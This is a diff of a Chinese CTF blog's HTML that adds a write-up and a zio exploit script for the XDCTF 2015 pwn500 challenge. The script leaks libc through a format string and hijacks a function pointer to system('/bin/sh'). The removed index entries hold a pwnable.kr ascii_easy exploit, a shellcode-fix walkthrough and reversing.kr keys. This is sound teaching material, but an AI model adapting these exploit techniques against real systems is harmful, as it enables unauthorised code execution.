@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Pwnable,练习," />
 
 
 
@@ -84,15 +84,55 @@
 
 
 
-<meta name="description" content="Dive dive dive into Binary">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Icemakr's Blog">
-<meta property="og:url" content="http://0byjwzsf.me/index.html">
+<meta name="description" content="pwn200Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xdctf-qual-2015-pwn">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Dive dive dive into Binary">
+<meta property="og:description" content="pwn200Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/4.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/5.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn400/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/4.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/3.jpg">
+<meta property="og:updated_time" content="2016-08-19T04:20:57.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Icemakr's Blog">
-<meta name="twitter:description" content="Dive dive dive into Binary">
+<meta name="twitter:title" content="xdctf-qual-2015-pwn">
+<meta name="twitter:description" content="pwn200Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与">
 
 
 
@@ -113,9 +153,9 @@
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn/"/>
 
-  <title> Icemakr's Blog </title>
+  <title> xdctf-qual-2015-pwn | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -146,9 +186,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -265,9 +303,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -287,10 +325,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016/08/18/xdctf-qual-2015-pwn/" itemprop="url">
-                  xdctf-qual-2015-pwn
-                </a>
+                xdctf-qual-2015-pwn
               
             
           </h1>
@@ -356,9 +391,7 @@
       
 
       
-        
-          
-            <h1 id="pwn200">pwn200</h1><h2 id="Conclusion">Conclusion</h2><p>之前看过<a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">@糖果师傅</a>的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。</p>
+        <h1 id="pwn200">pwn200</h1><h2 id="Conclusion">Conclusion</h2><p>之前看过<a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">@糖果师傅</a>的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。</p>
 <p>对于利用来说，其实只要在<code>.bss段</code>伪造三个结构即可，其分别对应<code>.rel.plt</code>，<code>.dymsym</code>，<code>.dynstr</code>中的结构体，这些段的地址可利用readelf查看，如下所示</p>
 <p><img src="/images/xdctf-qual-2015-pwn200/1.jpg" alt=""></p>
 <p>对于<code>.rel.plt段</code></p>
@@ -403,582 +436,61 @@
 <h2 id="Exploit-3">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./jwc'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([<span class="number">0x401624</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># student                       (0xf0)</span></span><br><span class="line"><span class="comment"># name      0x00    -   0x0f    (0x10)</span></span><br><span class="line"><span class="comment"># intro     0x11    -   0xd8    (0xc8)</span></span><br><span class="line"><span class="comment"># math      0xe0    -   0xe7    (0x08)</span></span><br><span class="line"><span class="comment"># english   0xe8    -   0xef    (0x08)</span></span><br><span class="line"><span class="comment"># dota      0xf0    -   0xe7    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exam                          (0x60)</span></span><br><span class="line"><span class="comment"># exam_type 0x00    -   0x03    (0x04)</span></span><br><span class="line"><span class="comment"># essay_len 0x04    -   0x07    (0x04)</span></span><br><span class="line"><span class="comment"># exam_size 0x08    -   0x0b    (0x04)</span></span><br><span class="line"><span class="comment"># essay_ptr 0x10    -   0x17    (0x08)</span></span><br><span class="line"><span class="comment"># score_fun 0x18    -   0x1f    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># essay                         (size)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name, introduce)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'your name, no more than 16 chars'</span>)</span><br><span class="line">    io.writeline(name)</span><br><span class="line">    io.read_until(<span class="string">'with no more than 200 chars to introduce yourself'</span>)</span><br><span class="line">    io.writeline(introduce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exam</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'length of your essay?'</span>)</span><br><span class="line">    io.writeline(str(len(essay)))</span><br><span class="line">    io.read_until(<span class="string">'OK'</span>)</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resit</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheat</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1024'</span>)</span><br><span class="line">    io.read_until(<span class="string">'here you can cheat :'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">200</span>)</span><br><span class="line">exam(<span class="number">1</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line">resit(<span class="number">1</span>)</span><br><span class="line">exam(<span class="number">2</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line"></span><br><span class="line">plt_printf  = <span class="number">0x4009b0</span></span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'%11$lx'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(plt_printf))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line">io.read_until(<span class="string">'math'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line">adr_libc_start_main_ret = int(io.read(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">off_libc_start_main_ret = <span class="number">0x21ec5</span>   <span class="comment"># ./find __libc_start_main ec5; ./dump libc6_2.19-0ubuntu6.6_amd64</span></span><br><span class="line">adr_libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret</span><br><span class="line">off_system      = <span class="number">0x46640</span></span><br><span class="line">adr_system      = off_system + adr_libc_base</span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'/bin/sh;'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(adr_system))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 <h2 id="Referance-1">Referance</h2><p><a href="https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md" target="_blank" rel="external">https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md</a></p>
 
-          
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/14/pwnable-rookiss-fix/" itemprop="url">
-                  pwnable.kr-rookiss-fix
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-14T00:00:00+08:00" content="2016-08-14">
-              2016-08-14
-            </time>
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
+            <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/14/pwnable-rookiss-fix/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/14/pwnable-rookiss-fix/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
+            <a href="/tags/练习/" rel="tag">#练习</a>
           
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h1 id="Conclusion">Conclusion</h1><p>容易发现shellcode存在栈上，而这也是bug所在，因为在shellcode执行过程中，随着栈帧的变化，会覆盖了还没执行完的shellcode</p>
-<p>shellcode如下所示</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/1.jpg" alt=""></p>
-<p>可以看到，在执行到<code>push eax</code>时，栈已经上升到了0xffbf3ca4，此时只要执行一次<code>push eax</code>，就会刚好覆盖了shellcode的末端</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/2.jpg" alt=""></p>
-<p><img src="/images/pwnable.kr-rookiss-fix/3.jpg" alt=""></p>
-<h2 id="Trials">Trials</h2><p>1.我第一个想到的是前几天刚见过的<code>popad</code>指令，这个指令也恰好只有1个字节，这个指令能一次性连续pop多次，可以把栈往下降一下，这样在执行的过程中就不会覆盖到shellcode了，不过用来传参的寄存器的值就被破坏了，试了多次无果<br>2.后来又试了修改第2个字节，使<code>xor eax, eax</code>转为<code>xor esp, eax</code>，虽然能也能达到降低栈的目的，不过传参的寄存器还是不能设置好，无果</p>
-<p>想了许久想不出来，只好又求助google大法了，找到了一位菊苣的解法，将指令<code>push eax</code>，改为<code>pop esp</code>，这样做同时达成了两个目的，既没有破坏寄存器参数的布置，同时又转移了栈帧</p>
-<p>这时会有另一个问题，<code>pop esp</code>，会将<code>esp</code>修改为<code>0x6e69622f</code>，作为栈，需要满足这块内存是可写可读的，但是这块内存区域是没有被分配的，这就成了一个问题</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/4.jpg" alt=""></p>
-<p>不过这题是个本地利用，也就是说我们可以利用<code>ulimit -s unlimited</code>指令来扩大栈的最大大小，这样当<code>esp</code>转移到了<code>0x6e69622f</code>时，会有一个内存访问错误，操作系统会自动把栈进行扩充，也就达到了将<code>esp</code>进行转移的目的，同时被修改的原指令<code>push eax</code>的作用（在栈上填充null）又“顺带”完成了</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/5.jpg" alt=""></p>
-<h1 id="Exp">Exp</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fix@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">fix@ubuntu:~$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line">fix@ubuntu:~$ ./fix</span><br><span class="line">What the hell is wrong with my shellcode??????</span><br><span class="line">I just copied and pasted it from shell-storm.org :(</span><br><span class="line">Can you fix it <span class="keyword">for</span> me?</span><br><span class="line">Tell me the byte index to be fixed : <span class="number">15</span></span><br><span class="line">Tell me the valude to be patched : <span class="number">92</span></span><br><span class="line">get shell</span><br><span class="line">$ ls</span><br><span class="line">fix  fix.c  flag</span><br><span class="line">$ cat flag</span><br><span class="line">Sorry <span class="keyword">for</span> blaming shell-strom.org :) it was my ignorance!</span><br></pre></td></tr></table></figure>
-<h1 id="Referance">Referance</h1><p><a href="https://blog.stypr.com/2015/09/27/pwnable-fix/" target="_blank" rel="external">https://blog.stypr.com/2015/09/27/pwnable-fix/</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
+              <a href="/2016/08/14/pwnable-rookiss-fix/" rel="next" title="pwnable.kr-rookiss-fix">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-fix
+              </a>
             
-              
-                
-                <a class="post-title-link" href="/2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="url">
-                  pwnable.kr-rookiss-ascii-easy
-                </a>
-              
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-11T00:00:00+08:00" content="2016-08-11">
-              2016-08-11
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/11/pwnable-rookiss-ascii-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
+          </div>
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h1 id="Trick">Trick</h1><p><code>ulimit -s unlimited</code> 禁用<strong>aslr</strong></p>
-<h1 id="Conclusion">Conclusion</h1><p><del>没有做出来，不过顺便翻了《Shellcode’s Handerbook》- Chapter 9 学习了下</del></p>
-<p>第二次来做，还是遇到了很多障碍，首先<code>system</code>的地址在计算出来后发现不是都是符合要求的字节，然后试了下<code>execve</code>发现可以</p>
-<p>接下来就是找字符串，刚开始试了<code>&#39;/bin/sh\x00&#39;</code>，都不符合要求。然后又试了<code>&#39;sh\x00&#39;</code>，也不符合要求，于是我就没辙了。再次求助google(即使是第二次来做也还是没做出来，心好累:(</p>
-<p>首先，<code>execlp</code>函数的原型为<code>int execlp(const char *file, const char *arg, ...);</code></p>
-<p>通过<code>man execv</code>，可以看到其中有一段对<code>execlp</code>函数的解释</p>
-<blockquote>
-<p>The execlp(), execvp(), and execvpe() functions duplicate the  actions  of  the  shell  in<br>searching  for  an  executable file if the specified filename does not contain a slash (/)<br>character.  The file is sought in the colon-separated list of directory  pathnames  speci-<br>fied  in  the  PATH  environment  variable.  If this variable isn’t defined, the path list<br>defaults to the current directory followed by the list of directories  returned  by  conf-<br>str(_CS_PATH).  (This confstr(3) call typically returns the value “/bin:/usr/bin”.)</p>
-</blockquote>
-<p>假使输入的<code>filename</code>不含<code>/</code>符号，就会采取和shell寻找可执行文件一样的方式去寻找这个文件，即遍历<strong>$PATH</strong>环境变量中的路径，在每个路径下尝试寻找<code>filename</code>文件</p>
-<p>因此只要将一个我们可写的路径加到PATH环境变量里，然后在这个路径下任意创建一个可以启动shell的文件，调整一个合适的文件名，使得能在内存中搜到这个文件名的字符串即可，这里选取了”h”文件名，在gdb中用<code>gdb$ find 0x5558b000,+0x1a6000,&quot;h&quot;</code>搜索该字符串，筛选符合要求的即可</p>
-<h1 id="Exploit">Exploit</h1><h2 id="log">log</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh ascii_easy@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">ascii_easy@ubuntu:/tmp$ mkdir icemakrrr</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; h</span><br><span class="line"><span class="shebang">#!/bin/sh</span></span><br><span class="line">/bin/sh</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">export</span> PATH=/tmp/icemakrrr:<span class="variable">$PATH</span></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0</span>x55643970</span><br><span class="line">adr_filenm  = <span class="number">0</span>x55665c6c</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0</span>xac</span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0</span>x0)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ python exp.py</span><br><span class="line">[+] Starting program <span class="string">'/home/ascii_easy/ascii_easy'</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input text : triggering bug...</span><br><span class="line">$ <span class="built_in">cd</span></span><br><span class="line">$ cat flag</span><br><span class="line">damn you ascii armor... what a pain <span class="keyword">in</span> the ass!! :(</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0x55643970</span> <span class="comment"># gdb$ p execlp</span></span><br><span class="line">adr_filenm  = <span class="number">0x55665c6c</span> <span class="comment"># find 0x5558b000,+0x1a6000,"h"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0xac</span></span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="Referance">Referance</h1><p><a href="http://werew.tk/article/12/ascii_easy-pwnablekr" target="_blank" rel="external">http://werew.tk/article/12/ascii_easy-pwnablekr</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-      
 
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/10/reversing-easy/" itemprop="url">
-                  reversing.kr-easy
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-10T00:00:00+08:00" content="2016-08-10">
-              2016-08-10
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/10/reversing-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/10/reversing-easy/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>都是easy题，逆向小白入门练习</p>
-<h1 id="reversing-kr-easy-crack">reversing.kr-easy-crack</h1><h2 id="Trick">Trick</h2><h3 id="OllyDbg">OllyDbg</h3><ul>
-<li><code>F2</code>      : 下断点</li>
-<li><code>F7</code>      : 单步步进</li>
-<li><code>F8</code>      : 单步步过</li>
-<li><code>F9</code>      : 执行到断点处</li>
-<li><code>ctrl+F9</code> : 一直运行直到ret指令</li>
-<li><code>alt+F9</code>  : 一直运行直到回到应用程序领空</li>
-</ul>
-<h2 id="Conclusion">Conclusion</h2><p>IDA加载程序</p>
-<p><img src="/images/reversing-easy-crack/1.jpg" alt=""></p>
-<p>容易发现用户函数<code>sub_401080</code>，其定义如下</p>
-<p><img src="/images/reversing-easy-crack/2.jpg" alt=""></p>
-<p>其中<code>GetDlgItemTextA</code>函数获取用户输入，下面的if判断语句即为<strong>Auth</strong></p>
-<p><strong>key: Ea5yR3versing</strong></p>
-<h1 id="reversing-kr-easy-keygen">reversing.kr-easy-keygen</h1><h2 id="Conclusion-1">Conclusion</h2><p>main函数中如下为关键部分</p>
-<p><img src="/images/reversing-easy-keygen/1.jpg" alt=""></p>
-<p>实现的效果相当于在循环中对输入的字符串s</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">16</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">32</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">48</span></span><br></pre></td></tr></table></figure>
-<p>处理完成后对输出的字符串作十六进制编码，与用户输入的serial比对</p>
-<p><strong>key:K3yg3nm3</strong></p>
-<h1 id="reversing-kr-easy-unpack">reversing.kr-easy-unpack</h1><h2 id="Conclusion-2">Conclusion</h2><p>题目提示程序加壳，只需寻找到OEP即可</p>
-<p>**key:00401150</p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/09/pwnable-rookiss-fsb/" itemprop="url">
-                  pwnable.kr-rookiss-fsb
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
-              2016-08-09
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/09/pwnable-rookiss-fsb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/09/pwnable-rookiss-fsb/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><ul>
-<li><del>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</del></li>
-<li><code>dump binary memory text 0xffffb5b0 0xffffdcb0</code></li>
-</ul>
-<h2 id="Conclusion">Conclusion</h2><p><del>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段</del></p>
-<p><del>等过段时间回来再写一次exp</del></p>
